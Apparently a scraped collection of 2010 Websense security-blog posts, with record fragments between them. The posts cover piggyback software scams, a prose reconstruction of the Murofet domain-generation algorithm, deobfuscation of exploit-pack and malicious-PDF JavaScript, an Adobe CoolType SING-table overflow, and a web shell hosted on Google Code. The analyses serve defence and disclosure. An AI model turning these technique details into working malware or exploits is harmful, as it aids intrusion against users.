months+\n      Adobe Acrobat\n    official-pdfdownload.com\n      2 months+\n      Adobe Acrobat\n    pdf-new2010.com\n      4 months+\n      Adobe Acrobat\n    pdfreader--2010.com\n      4 months+\n      Adobe Acrobat\n    the-movie-downloads.com\n      5 months+\n      Generic  / Streamer\n    watch-hd-movies-online.com\n      1 month+\n      Generic  / Streamer\n    www.online-tv-on-pc.com\n      28 days\n      Generic / Streamer\n    www.pdf-new-2010-download.com\n      20 days\n      Adobe Acrobat\n     \nThis is how piggyback scams generally work: The entrepreneurs (criminals, to be more precise) establish a software Web site where they sell piggyback software. They take care of the site\'s design, payment processing, the availability of the Web site, etc. They want to \"spread the word\" about the new site and get revenue. This is where spammers come in. They form a relationship with the entrepreneurs to create spam linking to the new Web site for a cut of the sales. The entrepreneurs are more exposed, so they are also more cautious. They protect themselves with license and term of service agreements. So they delegate the distribution responsibilities to spammers, who take more aggressive approaches since they\'re more anonymous and not affiliated officially with the Web site. \n \nHere is an example of a very recent, related spam message. Note the subject, and where\'s it is from: \nAction Required : Upgrade Your New PDF Acrobat Reader\n \n(Click on the images to see bigger versions)\n\n \nUsers that click the www.adobe-software-upgrade.com link are instantly redirected to the site below, pdf-new-2010-download.com.

Clicking the download button redirect buyers to a a page that collects their email address, name, and location. Once those details are submitted, the buyer is redirected to the payment site secureonline.ru which is also part of the scam: \n\n \nWe have seen hundreds of thousands of these messages, and the spam campaign is still ongoing. You might think that after seeing hundreds of thousands of messages, the spamming affiliate might get blocked by its partner, but, similar spam messages are still being sent out. They just use different domains that lead to the entrepreneur site with the same affiliate ID. It\'s easy money. In this case, the 2-day-old domain www.adobe-acrobat-sofware.com is used: \n\n \nHere are more visual examples of spammed piggyback software that profiteer from Skype (voip-online-access-now.com) and Google Earth (new-earth-online.com) respectively:\n\n\n \n\n \nSo who is the targeted in those kinds of scams? It isn\'t Joe Internet, who knows a thing or two about software. The ideal targets are novice Internet users--ideally the ones just starting to discover the Internet and its offerings. \nWhile we might take the Internet for granted, not everyone does. Some are dazzled, and believe it\'s innocent and all good. This could come from misinformation or naivety, but a lot of us were that way when we started out. So the target market is always there, and the fact that these attacks have been going on for a long time means they pay off. So this is an opportunity to advise people with a little less Internet experience than us to be a bit more aware and add an extra pinch of suspicion and doubt to their online shopping activities.', 'https://www.forcepoint.com/blog/security-labs/piggybacking-adobe-acrobat-and-others\n');

The first is composed of the month, day, and low byte of the year of the date of execution, plus 0x30 (48). The second DWORD value is based on the minute of execution, multiplied by 0x11 (17). This number is hereafter iterated 800 times to generate multiple domains. The resulting QWORD value is then hashed with the MD5 algorithm and each byte of the result is then used to generate one letter of the domain name by dividing it into 2 nibbles and, if a valid numeric representation of a letter of the alphabet, converted into that letter by adding 0x61 (\'a\'). For example, 0x42 = 0x4 + 0x2 = 0x6 = \'g\' (zero represents \'a\').  Each letter is then concatenated into a domain name.  Once the letter conversion loop is finished, Murofet applies a few rules to decide which domain extension to use. If the current iteration of the value derived from the minute value is divisible by 5, it uses \".biz\".  Failing this, if the derived value [bitwise] AND 3 results in zero, the extension \".info\" is used.  If this fails, it checks to see if the number is divisible by 3, in which case it uses \".org\".  Finally, if the number is divisible by 2 it uses \".net\", otherwise it uses \".com\".  Pseudocode for the above process is as follows:\n   \n  (Figure 1: domain generation pseudocode) \n \n  Because of the modular division of the iterated value derived from the minute the binary is run, there are exactly 1020 domains generated per day.  When Murofet finds a valid download at one of the links, it attempts to create a process.  Upon successful creation of the process, the thread attempting to find updates exits and the new malware does its job.  \n  If any security research professionals should need a domain list, please visit this link and make your request by selecting the \"other\" category.  Just let us know what date range you need and we\'ll do what we can to help out!', 'https://www.forcepoint.com/blog/security-labs/murofet-domain-generation-ala-conficker\n');

Visit Defensio.com for the only social media threat detection application that protects social media sites and Facebook pages from spam or profanity.\n  The highlight in Web 2.0 this month was a \"OnMouseOver\" flaw on twitter.com. The flaw, caused by XSS (cross-site scripting), delivered pop-ups to users when they moused over specially-crafted tweets. The tweets contained JavaScript code that ran the OnMouseOver event, which enabled the code to run without requiring a mouse click. The issue could potentially have been used by malware authors to spread malicious tweets that redirected users to malicious Web sites. The flaw was patched and is no longer exploitable.\n \nBrowser and friends\nA number of security flaws on some of the most-used media players - Apple\'s iTunes and QuickTime, and Real Network\'s RealPlayer, hit the September headlines.  While RealPlayer and iTunes released patches for known vulnerabilities,QuickTime faced a classic drive-by 0-day that may lead to arbitrary code execution by visiting malicious Web sites or images. Websense® ACE (Advanced Classification Engine) identified and protected our customers against this attack at least a month before this news broke out.\n\n  Google Chrome marked its 2nd birthday by delivering patches on 15 known vulnerabilities. Firefox also released patches for 15 vulnerabilities, including fixes for the DLL load hijacking issue. Apple released patches for 3 security holes in its Safaribrowser, 2 of which affects Safari and iTunes\' open-source rendering engine Webkit.\n\n  A security update for Adobe Flash Player was released mid-September for a 0-day that allowed the attacker to gain control of affected systems. CVE-2010-2884 affects Flash Player version 10.1.82.76 and earlier, Adobe Reader 9.3.4 and earlier, and Adobe Acrobat 9.3.4 and earlier.\n \nMicrosoft\nMajor DLL load hijacking issues crossed over from the end of August to the beginning of last month affecting not only Microsoft, but other popular vendors as well.  Microsoft then released a one-click \'Fix It\' tool a day after the delivery of theCWDIllegalInDllSearch utility, which secures the system by rejecting unsafe DLL loading behavior. Both tools work hand-in-hand to protect users against the latest DLL load hijacking issues that ultimately lead to remote code execution attacks.\n  10 bulletins meant to fix at least 11 known vulnerabilities in Windows and MS Office Suite were dispatched in this month\'sPatch Tuesday, 7 of which are for remote code execution. Critical patches are for Print Spooler Service (MS10-061), MPEG-4 Codec (MS10-062), Unicode Scripts Processor (MS10-063), and Microsoft Outlook (MS10-064).\n \nHello Threatseeker. You\'ve got mail!\nThe start of the month saw the use of an old trick involving an .scr file masquerading as a .pdf file using the \"Here You Have\" malicious emails.  It is interesting that there is no need to re-invent the wheel when you can simply recycle methods and processes, in this case the use of an old worm being spread using different means.  Surprisingly, this escaped most AV engines as verified on VirusTotal. \n  Jumping on the band wagon of using any means to get users\' attention and to propagate attacks, this month saw further blended attacks employing everyday tools we have grown accustomed to, such as Skype-themed malicious emails and Facebook password reset emails leading users to rogue AV downloads.  \n  There is no shortage of the use of social networking sites or related emails to spread malware. However, the intriguing aspect of these attacks is that they are blended; what happens in the background, unknown to the user, is pertinent. One might think they have been redirected to a rogue AV site and that is all, but they could have potentially kicked off a chain reaction with redirects to an exploit site where an exploit kit or other damaging content would be downloaded to the user\'s machine.\n  Later in the month, there was the use of tragic news to spread malicious content, as in the case of the death of Daniel Covington. The blended attack in this case did not only take users to a Rogue AV download page but also downloaded the Phoenix exploit kit. \n  This month teaches us two things in our opinion, \"Spammers will use any means to propagate their malware\" and \"We need to pay special attention to blended attacks\"\n\n \n\n \n\n \n\n \n\n \nSecurity Trends\nThe Route to Malware shows that just 2 clicks can get to malicious code on an infected Web site. Websense researchers looked at how most Internet users were only 2 clicks away from malicious content in one of three ways: from top sites, poisoned search results, and malicious links.\n   \n  Fake warning pages start displaying on a user\'s browser. The trick was used by a new rogue criminal as a social engineering scheme in order to  trick users into downloading and installing the rogue.  The fake warning pages are so similar to the real thing that it can trick even highly-trained eyes.\n   \n  Security vulnerabilities prevent companies from adopting Web 2.0 in their business practices.

These descriptions are meant for another time and another campfire story.  Below, we can see the attack code served by Eleonore.  All we know is that this code is meant to exploit visitors. From looking at it, we can\'t tell how visitors are being attacked.  In order to understand the how, we need to deobfuscate the code to make it human-readable.\n \nThis is a screenshot of the Eleonore Exploit Pack\'s attack code served to visitors:\n\n \nFirst off, I\'ll tell you that I cleaned up this code a bit. The attack code is longer than 31 lines, but I removed most of the encoded or obfuscated attack code to make the rest of the source code easier to see.  \n \nHint:  The variable oRxBt5K8aKg9Ig is the shortened obfuscated code. This will be primarily what we try to deobfuscate. \n \nLooking at the code on this page, we can see that it\'s fragmented, meaning that not everything needed to deobfuscate the code can be found on this page.  At the top of the page, there is a JavaScript file that we\'ll need to fetch in order to fully deobfuscate this code.  Why is the attack page fragmented in this way? I would venture that it\'s another protection mechanism, because some tools can\'t handle code that is separated by files. For example, I can\'t parse the script out of this page and expect malzilla to deobfuscate it for me.\n \nScreenshot of 432.js:\n\n \nLooking at the first variable that is declared after the long, obfuscated variable, we can see a function call to jklsdjfk(). This function can be found in the 432.js file fetched at the top of the attack page.  Looking further into 432.js, we can see that the function basically concatenates a few strings together to return \"unescape\".  After setting var dsl = unescape, there is another variable declared which is set to the character \"%\". Anybody who has handled deobfuscating scripts by hand can probably already figure out what\'s going on here.  This page is simply using a cipher for the % in that encoded variable to get our attack code.  If you look closely at the encoded variable, you can see there is a repeating pattern \"kljf hdfk sdf\"followed by two hex digits.  This obfuscation simply is a cipher of kljf hdfk sdf for % and unescaping the variable to get the attack code. \n \nTo make this pattern easier to see, here is a screenshot of the encoded variable from above:\n\n \nNow we can take this variable, replace the cipher, and unescape it a couple of times because it\'s actually double escaped and viola we can see the true intent of this obfuscated page.  Looking at the clear code text that we now have, it\'s obvious that this page is up to no good by trying to invoke a number of exploits.  There is even a reference to an executable on the page called updates.exe! \n \nWho would have thought 51 lines of code could cause this much damage?\n \nHere is a screenshot of the clear attack code:', 'https://www.forcepoint.com/blog/security-labs/eleonore-exploits-packs-unescape-cipher\n');

Sixty-five percent of the largest 100 international companies have active accounts on Twitter, 54 percent have a Facebook fan page, 50 percent have a YouTube channel, and one-third have corporate blogs.\nThe Nielsen Wire reports that the world now spends over 100 billion minutes or 22 percent of all time online on social networks and blog sites.\nUnfortunately, as the popularity of these sites grows, so do the security risks associated with them. The dangers associated with social networking are magnified in businesses, as organizations are exposed to data loss risks in real time. Google and Facebook have both fallen victim to malicious attacks designed to steal confidential data. In addition to this, hackers are now flooding the walls on social networks with spam and malware. Websense products are specifically designed to scan every piece of content on social networking sites in real time.\nAnother risk is from users themselves. Employees may accidentally post confidential information to a social networking site. Websense has found that data loss over the Web is four times more likely than over email, because when employees use email, they’re typically emailing their peers at work. Data sent to a social site may be open to anyone. \nWebsense® offers solutions that help organizations take advantage of social networking sites while helping to prevent the risk of data loss, malware, and the constant threats that are delivered through even the most legitimate sites.

Social Media Attack Methods and Prevention By Robert Ayoub, Frost & Sullivan', 'Sean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'In the recent years social networks have become a new generation Web tool for corporate environments, offering sophisticated business intelligence, marketing, and analytical capabilities. The rise of Web 2.0 has predominately been steered by the prolific penetration achieved by social network engines such as Facebook, MySpace, and LinkedIn amongst diverse user groups, satisfying both business and common-user needs. Today, social networks boast a subscriber base that includes entrepreneurs, business executives and celebrities in addition to the younger generation of Web-users.\n\nSocial Networks as a Vehicle for Attack\n\nSince social networks are self contained messaging platforms, it should be no surprise that many of the same threats that have plagued users for years have found their way onto social networks. Some of the most popular methods for attack include:\n\nSpam/Phishing\n\nUntil recently, e-mail was the chief mechanism used by spammers for spreading malware.  With social networks gaining immense popularity among Internet users, spammers have started leveraging social networking platforms such as LinkedIn, Facebook, MySpace, and Twitter for spreading spam and ultimately, malware.\n\nShortened Links\n\nThe increasing popularity of microblogging sites such as Twitter has led to an explosion in the use of link shortening services such as tiny.cc, bit.ly, and others.  These services offer click tracking and are an invaluable tool for microbloggers.  Unfortunately, an end user has no way of knowing what is on the other end of the shortened link without clicking on it.  This gives criminals the potential to send legitimate sounding links that actually lead to malicious sites.\n\nMalware on Third Party Applications\n\nSocial networks such as Facebook, MySpace, and others encourage the development and deployment of third party applications.  According to industry estimates, Facebook alone has over 24,000 third party applications and more than 70 million users on the network utilize such applications for entertainment or for adding flare to their profiles. Attackers are looking towards leveraging the third party applications as a vehicle for spreading malware.\n\nDefending against the attack\n\nSocial networks by their nature provide a difficult environment for enterprise administrators to defend.  The networks are hosted by a third party and the enterprise has no control over the security of the sites.  As pointed out previously, it only takes a single click by a single user to infect the entire enterprise.  Enterprise IT administrators are in the difficult position of having to allow social networks without having the means to protect those networks.  This means that IT administrators have to taken different steps to protect their user base.  Some industry best practices are illustrated below.\n\nUser Awareness Campaigns\n\nThe lack of awareness of users towards the diverse types of attacks thereby presents a major challenge, impeding the establishment of adequate security in social networking engines. If users abstain from opening malicious links, the scale of malware propagation could be reduced significantly. Similarly, users need to exercise caution even if a URL is provided by a trustworthy friend on the buddy list as hackers often exploit the buddy lists of users to spread spam and malware. In addition to that, users on social networking platforms need to be vigilant about installing third-party applications on their profiles.\n\nRedefinition of Security Policies\n\nThe need for a redefinition of security policies is one of the most critical challenges for the businesses. In many cases, existing security policies were not designed with social networking in mind.  While social networking sites can provide enterprises with an open channel to interact with millions of public-users, it is important for enterprises to understand the significance of governing the use of social sites.\n\nRobust Security Technology Integration\n\nFinally, social networks need to employ malware and spam filtering technologies.  These can be in the network, or from the cloud. Typically, these security solutions are capable of efficiently thwarting the majority of malware and spam that propagates through social networks. Additionally, data loss prevention solutions that prevent sensitive data traveling outside the corporate network can be extremely valuable in keeping corporate data from leaking out to a social network either accidentally or intentionally.  On the flip side of protecting their users, it is also important that organizations secure the content that is posted to their social networking platforms – whether they host these platforms themselves on their corporate site, or in the public domain on sites like Facebook.  As organizations leverage their online presence to connect with customers, partners, and grow their business, they should be mindful of how they control and secure the content that is publicly posted.   No business wants their data or brand compromised.\n\nConclusion\n\nSocial networking is here to stay.  There are too many advantages to enterprises in terms of marketing, recruiting, and information sharing for organizations to ignore social networks, but that doesn’t mean that enterprises should allow their users to run rampant.  A careful implementation of user awareness campaigns, security policies, and security technologies can ensure a safe environment that allows enterprises to safely tap into the power of social networks.\n\nRobert Ayoub, CISSP, is a Global Program Director for Network Security at Frost & Sullivan.\n\nThe content featured in the Industry Analyst Corner is the sole representation of the author, independent of Websense, Inc.', 'https://www.forcepoint.com/blog/insights/what%E2%80%99s-hiding-behind-tinycc-link-social-media-attack-methods-and-prevention-robert\n');

WithWebsense® Advanced Classification Engine (ACE), Websense customers are proactively protected against this threat.  \n\n\n	 \n\n\n	The email appears to be a transaction receipt for someone who was enticed to buy rogue AV software called Security Suite Platinum.  Since Security Suite Platinum is a pretty popular rogue AV, it came as a surprise that none of the AV engines in Virus Total actually detected it.  This led us to look deeper into the binary.\n\n\n	 \n\n\n	What does Security Suite Platinum actually do?\n\n\n	Security Suite Platinum is a well-known rogue antivirus which uses scare tactics to extract fees from unsuspecting users. It acts like a legitimate virus scanner, searching a computer for viruses, trojans and other malicious files. At the end of its \"scan\" it claims to have detected malware which scares a user enough into paying a small fee to remove the threats.\n\n\n	This part has been discussed many times before in a variety of security forums and blogs. However, what happens when a person actually pays the required fee is not so clear.\n\n\n	After paying a registration fee the user will receive an email with a confirmation and download instructions, as you can see in the email sample above. After clicking the link provided and typing the transaction ID, the Web site leads us to download the registered Security Suite Platinum straight away.\n\n\n	The registered Security Suite Platinum contains real open-source antivirus, called ClamAV. Think of it this way: it’s like ClamAV, but illegally used to operate as Security Suite Platinum. Security Suite Platinum actually turns out to be somewhat \"real\" antivirus in that it actually does detect some malicious files and behaves almost like real antivirus software.  This also explains why none of the AV engines in Virus Total detected this binary.\n\n\n	\n\n\n	 \n\n\n	By a simple string search we can clearly prove the existence of the well-known open-source antivirus inside the rogue AV.  \n\n\n	So far so good, so what is wrong with this? First, it scared people into paying a fee using fake detection (not to mention the bad guys getting hold of a user’s financial information). Second, although the code running the rogue AV is legitimate AV, it is still not a legal and truly legitimate antivirus. There’s no trustworthy company behind it run by antivirus experts. The detection rate cannot be guaranteed. Finally, it is just an illegal use of free and open-source antivirus software acting like it is proprietary, asking for money when anyone can get it free. \n\n\n	To test its detection capability we just copied several random malicious files into the %SYSTEM32% directory to see if the registered Security Suite would really detect it.

All sites that opted to display a \"Small Business Success Index\" widget were infecting their visitors. This includes sites not hosted by Network Solutions itself, such as Google Blogger accounts that installed the widget. Armorize has a more detailed analysis here, and pegged the number of compromised sites at a minimum of half a million (source: Google) or five million (source: Yahoo).

Basically, when you fire up an app in Windows (e.g. Microsoft PowerPoint), more often than not big apps search a series of locations for \"helper\" libraries to assist with the job. Knowing that the app will search for other libraries to execute, a bad guy can place a malicious binary in the location the app is searching in an attempt to trick the app into thinking that the malicious file is the correct library.

But what about people who intentionally try to get exploited by a drive-by, whether they understand it in those terms or not?!? Yes, we\'re talking about the much hyped JailbreakMe Web site for Apple\'s iOS. Basically, all you need to do is open your browser from your iOS device (iPad, iPhone, etc.) and visit the Web site. With just one click (or \"swipe\" on the \"touch\" interface) and the Web site jailbreaks your device (using an exploit). The broader food for thought here is that whereas this Web site prompts for your permission to execute an exploit on your device to do things the owners consent to, the fact that this is technically possible (our research) in the first place opens the door to malicious Web sites that don\'t have to prompt you for permission to do malicious things on your device that you don\'t consent to.\n  In other news, watch out for malicious fake YouTube pages and malicious links that show up in Bing search results, both of which can lead to rogue or fake anti-virus software.\n \nWeb 2 dot uh oh\nThis month saw a huge increase in the number of abused and fake accounts being used for spam propagation such as in the case of the fake Friendster.com accounts that seem to have happened over the course of a few days (blogged abouthere).   \n  The threat of Web spam seems more real than ever as the world of Web 2.0 and the use of social networking sites becomes ever more popular.  Another way to look at it is that \"it is really here to stay\".\n \nBrowser and friends\nAt the Black Hat USA 2010 conference, researcher Charlie Miller presented an exploitable vulnerability in Adobe\'s PDF Reader. Adobe delivered an out of cycle patch in the middle of August to patch the CVE-2010-2862 vulnerability and another critical vulnerability. Adobe also released two security updates this month, one was for Adobe Flash Player, which fixed six critical vulnerabilities, and the other was for Shockwave Player.\nA security update for QuickTime was released in early August, to plug a hole that allowed arbitrary code execution. At the end of August, a 0-day vulnerability in Apple\'s QuickTime player was discovered. The flaw affected the latest version of QuickTime (7.67.75.0), an alert was published here.\nGoogle released Google Chrome 5.0.375.127 with patches for 9 security holes. Google paid $10,011 to award those who reported the bugs.\nOpera released Opera 10.61 update which fixed three vulnerabilities.\n \nMicrosoft\nMicrosoft had to send out an out-of-band update to patch the LNK vulnerability that was discovered last month. One week after that, Microsoft had a record \"patch Tuesday\" that included 14 bulletins patching 34 vulnerabilities, eight of them were critical. The patches affected Windows, Microsoft Office, Internet Explorer, SQL and Silverlight. \n  However, Microsoft is not alone in the game as Adobe had to patch 10 critical vulnerabilities in Flash Player, Flash Media Server, and ColdFusion.\n \nHello ThreatSeeker. You\'ve got mail!\nThis month in the email space saw some of the usual suspects come around again.  There were spoofed Microsoft emailsthat tried to get users to download a spam bot executable.  The attackers tried to make recipients of these emails believe that they needed to patch their systems for a dangerous 0-day attack.  We also saw a large spike in malicious spam that used various subjects which looked personalized as a social engineering trick to entice recipients to open malicious attachments in emails.  \n  For attackers, every day is tax day as they continued their tax themed social engineering tricks.  This campaign of emails contained variants that told of under reported income warnings or higher tax bracket notifications.  These messages also either contained a link to a malicious executable or an attachment.  \n  Perhaps the most interesting trend this month was the use of many brands with which to spam people.  This technique is nothing new, but how it was being used was a bit new.  With these messages, we saw the use of malicious links that were meant to download and install Rogue AV software on victim computers.  This is a bit new as most attacks involving Rogue AV used Blackhat SEO as their attack vector.\n\n\n\n\n\n \nSecurity Trends\n60GB of accounting data for social networking sites, bank accounts, credit card numbers, and intercepted emails were stolen by a mini ZeuS botnet dubbed Mumba. Thirty three percent of the infected users are based in the U.S, followed by 17 percent in Germany, and 7 percent in Spain. \n  The first SMS Trojan for Android OS has been detected as Trojan-SMS.AndroidOS.FakePlayer.a spread in Russia. For now, the Trojan only causes losses for Russian users, and as far as we can tell, it’s currently not being spread via the Android Marketplace.\n  A kind of Interesting PHP injection has been found by researchers.  The script uses the User-Agent field as the deobfuscation key and the injected PHP script contains multiple eval() calls of which every one uses a different deobfuscation key.\n  The United States edition of the second annual International Barometer published by Panda Security showed that 46 percent of U.S. small- and medium-sized businesses (SMBs)  have fallen victim to cybercrime, up two percent from last year’s survey.  The group surveyed nearly 10,000 SMBs around the globe and more than 1,500 in the United States.\n  Innocent companies with good reputations are targeted by identity thieves looking for valid certificates to provide malware authors. There are many possible scams purposely make it very difficult to verify that the CA coming from a company is genuine.

In this blog we will review one of these: a challenging PDF obfuscation that we have recently seen in a mass injection. \nOur ThreatSeeker Network detected several hundred Web sites injected with an iframe where the payload Web site was located in Ukraine. When a user visits a legitimate Web site which was compromised by this threat, the browser automatically follows the injected iframe to a malicious site, downloading the PDF file. This then utilizes several vulnerabilities in the PDF viewer, infecting the computer silently which downloads further malware to the machine. Although Websense customers were already protected from this threat by our existing real-time analytics, we found it interesting to analyze the malicious PDF file in detail. \nThe first thing we can see in the PDF file is that it has several small JavaScript streams inside: \n\n \nIn fact these scripts belong together, as the main JavaScript object suggests:\n \n/Names [(42a0e) 12 0 R (140) 14 0 R (57) 16 0 R]\n \nWithout too much confusion here we can easily see that there are references to objects 12, 14 and 16. That tells the PDF reader that the content of the JavaScript has been split up into three objects; therefore we need to concatenate them together to see the entire script at once. \nAfter this all we need to do is to tweak the code a bit so it can be analyzed by a human. The steps we have taken were only a few easy modifications, including indenting, otherwise known as beautifying the code. That simple step made the code generally readable but still it was hard to understand how it works - partly because the script was injected with junk code fragments that were irrelevant to the algorithm itself and the only reason the fragments were there was to make the code difficult to read. After removing these, the code shrank to half the size and was much easier to understand. There was only one small final step left: to analyze each of the procedures there and rename obfuscated variable and function names to relevant ones. It only took a few minutes, and the result was this: \n\n \nFrom this point we can see the two API calls, getPageNumWords and getPageNthWord. The first one is used to determine the number of words in a PDF page, while the latter one picks up a word from the page. We can clearly see therefore that this JavaScript code makes operations with the words used in the PDF document, but why would it do that? \nTo understand better we need to examine an another PDF object stream, the page content: \n\n \nIt might look a bit cryptic at first glance, but for the sake of simplicity it is enough to know that it only sends some rendering information to the PDF viewer and then after the \'Td\' tag inside the brackets we can see the text content itself. We are interested only in the text, as we do not need to know how it would be displayed. As we can see, it contains loads of short words, each one of which is basically a three or four digit hexadecimal number. The algorithm shown above tells us that it uses only the last two digits from each one of these numbers, so we need only those for a successful de-obfuscation. Also easy to spot in the decoder is that it uses a lightweight decryption routine to get back the clear content of the encrypted stream. \nNow that we know enough let\'s decode it! We ended up revealing this code: \n\n \nFrom this point we can clearly see the obvious malicious content. Our malicious PDF sample utilizes several different vulnerabilities which have suffered exploit attempts with a shellcode sprayed all over the heap.\n \nBy the time of writing the malicious PDF was detected only by four antivirus products, according to VirusTotal:\nhttp://www.virustotal.com/file-scan/report.html?id=b2a6edf15f132e0a112b81be05d8f2acf1b1054e0f32b32884a81c3743ea9c8a-1283532947\n \nThe shellcode downloads a trojan which also had a poor detection rate:\nhttp://www.virustotal.com/file-scan/report.html?id=6a8a7795b01ce008057db2f53517c92ee43341949b600024a518951340c99d91-1283533509\n \nAs we can see from this example, obfuscation techniques are always changing and bad guys are always challenging our engines. Unlike traditional obfuscation methods, with this one it is not enough just to load a single JavaScript stream from the PDF file: you need all three of them, and even the text content needs to be processed for a full de-obfuscation. Here at Websense Security Labs, therefore, we are constantly monitoring the latest tricks and improving our technologies accordingly to provide the best protection to our customers.', 'https://www.forcepoint.com/blog/security-labs/malicious-pdf-challenges\n');

It is a classic stack buffer overflow inside CoolType.dll. CoolType.dll has developed a bad reputation during the last few months. This module has become a popular target for attackers. Interestingly, the last jailbreakme.com exploit against iPhone also leverages a vulnerability inside a font processing routine. And it is also a stack overflow. You can check out our analysis here.\n  Looks like it\'s not using return address or SEH overwriting to gain EIP control, but controls some stack data and takes advantage of the calls made after the buffer overflow.\n  The buffer overflow itself is caused by a strcat API call on a fixed-size stack variable. You might wonder what element of a PDF document can cause this issue. A blog post titled Return of the Unpublished Adobe Vulnerability from the Metasploit project identifies the \"uniqueName\" field in a SING table as causing the issue. So we dug into the issue by writing our own PDF parser to see what we can find. \n  The SING specification can be found in GlyDevKit.zip. The archive contains the specification file named \"Gaiji SING Glyphlet Spec.pdf\". \n\nIllustration 1: Malicious PDF Dissection\n \nIllustration 1 shows the SING table that is breaking Adobe parsing code. The \"uniqueName\" field is supposed to hold an ASCII string. The specification document clearly states that the \"uniqueName\" field is 28 bytes long and 7-bit ASCII with null-termination. The problem with the data here is that it\'s not null-terminated. \n\nIllustration 2: Raw Data of SING Table\n \n\n  Illustration 2 shows the raw data causing the overflow. \n\nIllustration 3: The Vulnerable Code with Unsafe strcat Call\n \nIllustration 3 shows the actual code that leads to buffer overflow. When the block starts, the eax register holds the pointer to the start of the SING table. The offset to uniqueName(10h) is added to the register at the first instruction (00803DD9F). It is used directly for strcat operation without any kind of sanitization or verification. At the very least, the code should force null termination or verify null termination. Or they can just copy a fixed size of data out of the \"uniqueName\" field because it\'s a fixed-sized field.\n\nIllustration 4: Contaminated Stack after Overflow\n \nAfter the strcat call is performed the stack is ruined as shown in Illustration 4. \n  So with this Adobe 0-day, we can learn two lessons. First, don\'t trust any user data and don\'t pass any data without sanitization or verification. Second, it might be time to throw away old unsafe string APIs.\n \nThanks to Mila Parkour for providing the sample.', 'https://www.forcepoint.com/blog/security-labs/brief-analysis-adobe-reader-sing-table-parsing-vulnerability-cve-2010-2883\n');

I decided to have a look at what kinds of malicious Web-based code Threatseeker has detected on the site. In particular, one interesting example came up: one of the pages hosted on Google Code was a PHP-based Web console code - you might ask, what\'s a Web console? It\'s a Web tool that enables its user to control remote shells - it\'s like telling a remote-controlled host what to do via the Web. So the one we\'ve got is certainly one used by the baddies and is known by the name of \"r57shell\". (I just want to be clear that remote PHP shells can be used by black-hats and also by penetration testers. This variant was developed by the black-hat community and is also known to be backdoored, which means that some versions are planted with backdoor code, so users of this software themselves are exposed to an attack.)\n \nHere are some screen-shots of the Web console code and the various options it offers.\nThis code is located at: http://[removed].googlecode.com/svn/[removed]/webshells/r57shell.php: \n\n \n\n \nWhen browsing the project\'s SVN, a whole set of penetration and black hat tools is revealed, of which some are also Trojan files:\n\n \nIt looks like the person that initiated this project tried to stay anonymous, as every link to the author\'s Web site was inactive.

', 'Forcepoint Sean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'Sure, email is the single most important communications tool of any company, and we\'ve had years to manage its various security risks, but it turns out some relatively recent changes in both how we use email, and how the bad guys leverage it, make it worth rethinking our email security strategies. You\'ve probably heard this all before, but I think it\'s worth a hype-free look at two of the latest trends in email security.\n\nManaging Attacks\n\nThe most effective attacks these days are no longer focused on the network, but on your Web applications and what the attackers call clientside exploits. Clientside attacks take advantage of vulnerabilities in the applications used most commonly on your desktops and laptops — email and Web browsing. Since we\'ve gotten pretty good at blocking standard old viruses via email, recent attack methods focus on tricking users into opening infected documents your antivirus might miss, or tricking them into clicking malicious Web links.\nThese techniques are so effective since attackers will customize the emails for your individual organization (if you are a target) and even the individual user. They also take advantage of serious security vulnerabilities in standard office documents such as Adobe PDF files; not requiring the user to download actual executable applications. Some of the malicious software is even designed specifically for your organization, making it less likely any signature-based antivirus will stop it.\nFrom an email security standpoint we now use a variety of techniques that are quite a bit better at reducing these attacks (but it\'s pretty impossible to completely stop them). One of the most promising technologies, which we see in antivirus tools as well as email and Web gateways, is \"reputation filtering\". Rather than relying completely on known signatures, or unreliable endpoint heuristics, reputation filters combine the collective knowledge of everyone using the security solution and analyze all inbound messages and Web links. Ones that originate (or direct) to untrusted sources are blocked before ever hitting the user.\nThese work because high level SPAM patterns, monitored across many organizations and networks, turn out to be fairly reliable indicators of malicious activity. Combine this with the old-school signature scanning, the vendor\'s research team, and traditional SPAM filtering and it results in a system that does a reasonable job of identifying patterns early.\nReducing Data Leaks \nEven though the biggest security breaches in the press are rarely the result of email leaks, we find that keeping an eye on outbound employee communications (while still respecting their privacy) reduces a lot of the day-to-day risks and compliance headaches.\nIf you\'ve ever read any of my research you know I\'ve long been a fan of Data Loss Prevention (DLP) and its advanced deep content analysis techniques. DLP allows us to build far more effective rules than simple keyword filtering or pattern matching; those that account for business process and experience low false positive rates.\nEmail tends to be the first place where most organizations deploy DLP and there are a few tricks to having a successful deployment: \nMake sure you have an enforcement work flow to handle any major incidents before you deploy DLP. The odds are very high you\'ll find some major issues early on that will quickly involve legal and human resources.\nStart with a single policy, test, and tune it, then expand over time. Depending on what you are looking for even with low false positives you will likely see a lot of policy violations until you retrain user habits.\nIf you leverage cloud-based email security you have two options for DLP. Either your cloud provider needs to include it with their service, or you need to scan all emails on your own network before it heads to the cloud. Check your email architecture and if DLP is something you think you want, I highly suggest planning for it even if you aren\'t implementing immediately.\nFinally, don\'t forget that a large proportion of your user\'s email might never hit your email server... or even be email. With the continuing proliferation of Web-based email and social networking you might also consider content-based filtering for Web communications. By taking a content focus you can still allow users to leverage these services while reducing your risks (at least when they are on corporate systems and networks). And don\'t forget to pick something that can scan SSL-encrypted sessions, even if it means a little work configuring your endpoints so users don\'t constantly see certificate alerts.         \nRich has twenty years of experience in information security, physical security, and risk management.

The problem with having this type of security in your organization is your exposure to modern threats. These security providers can only update signatures to chase threats after they happen, a method that is archaic at best.\nHackers have outsmarted antivirus vendors by placing threats where traditional antivirus companies can’t find them. These cybercriminals are no longer spending their time trying to get people to click on compromised images in emails, such as free screen-savers. Instead, hackers have gone from inserting threats in emails to using email as a vehicle to transport users to compromised sites.  Today, users are literally taken for a ride (via email) to these dangerous destinations online. \nWhen the hackers changed their strategies, antivirus vendors added more products to their existing portfolios. These additional products are positioned to tie back to their core antivirus technology and are not unified in any way.  Most antivirus companies that offer email security solutions still only focus on blocking spam and stopping threats in the email itself. The risk to exposure is higher because most of these companies don’t have proper tools in place to analyze links that contain actual JavaScript attacks within the emails. In essence, these companies are not equipped to handle silent attacks such as a boot client which can install itself and run quietly in the background. \nWebsense® security solutions take a different approach.  The focus at Websense has always been to create mechanisms that look at categories, not sites. By building analytic systems Websense is able to determine what type of information resides on each site. In addition, Websense Web, email, and data loss prevention solutions are all built to work together in a fully unified manner.\nUsers are also protected by the Websense ThreatSeeker® Network which analyzes tens of thousands of URLs in real time every single day.

